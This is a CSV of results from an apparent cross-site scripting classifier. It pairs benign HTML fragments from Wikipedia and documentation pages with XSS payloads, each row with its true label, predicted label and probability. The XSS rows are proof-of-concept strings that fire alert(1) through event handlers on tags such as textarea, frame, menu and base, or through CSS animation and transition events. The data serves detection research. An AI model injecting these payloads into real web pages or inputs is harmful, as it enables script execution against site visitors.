Unnamed: 0,payload,label,predicted_label,probability
2644,<textarea autofocus onfocusin=alert(1)>test</textarea>,1,1,0.998305
6,"<li><a href=""/wiki/Contextualism"" title=""Contextualism"">Contextualism </a> </li>",0,0,0.000104598905
8938,	 </span>,0,0,6.0303642e-05
1907,	 </span> 2018 ,0,0,4.4268872e-05
2396,"        <span class=""commit"">",0,0,5.059268e-05
6165,<frame onpointerenter=alert(1)>XSS</frame>,1,1,0.9971922
8411,<custom tags onpointerout=alert(1)>XSS</custom tags>,1,1,0.9977421
3779,	 </span> </li>,0,0,4.039223e-05
8998,"<style>@keyframes x{}</style><textarea style=""animation-name:x"" onanimationstart=""alert(1)""></textarea>",1,1,0.9975588
6653,"<li><a href=""/wiki/History_of_robots"" title=""History of robots"">History </a> </li>",0,0,0.00013843625
1063,"<style>:target {color:red;}</style><nextid id=x style=""transition:color 1s"" ontransitionend=alert(1)></nextid>",1,1,0.99791586
11551,"<nobr ondblclick=""alert(1)"">test</nobr>",1,1,0.9971592
5371,"<BR SIZE=""&{alert('')}"">",1,1,0.99593776
5034,"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;950–952, </li> </ul>",0,0,0.0001375317
4761,"<base onbeforecopy=""alert(1)"" contenteditable>test</base>",1,1,0.99765253
13611,"<li class=""toclevel-3 tocsection-62""><a href=""#Computationalism_and_functionalism""><span class=""tocnumber"">8.4.2 ",0,0,0.00012625396
6719,"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/spiders.html"">Spiders</a></li>",0,0,0.00015212758
10980,<menu onpointerdown=alert(1)>XSS</menu>,1,1,0.9976597
2919,"<li><a href=""/wiki/Ant_colony_optimization"" class=""mw-redirect"" title=""Ant colony optimization"">Ant colony optimization </a> </li>",0,0,0.00011592929
8468,"<colgroup oncontextmenu=""alert(1)"">test</colgroup>",1,1,0.9977321
13563,"<li class=""toctree-l1""><a class=""reference internal"" href=""intro/install.html"">Installation guide</a></li>",0,0,0.00015158154
8590,"<li><a href=""/wiki/Structuralism_(philosophy_of_science)"" title=""Structuralism (philosophy of science)"">Structuralism </a> </li>",0,0,0.00011120203
13547,"	 <div id=""Robotics"" style=""font-size:114%;margin:0 4em""><a href=""/wiki/Robotics"" title=""Robotics"">Robotics </a> </div> </th> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Main articles </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,0,2.1069382e-05
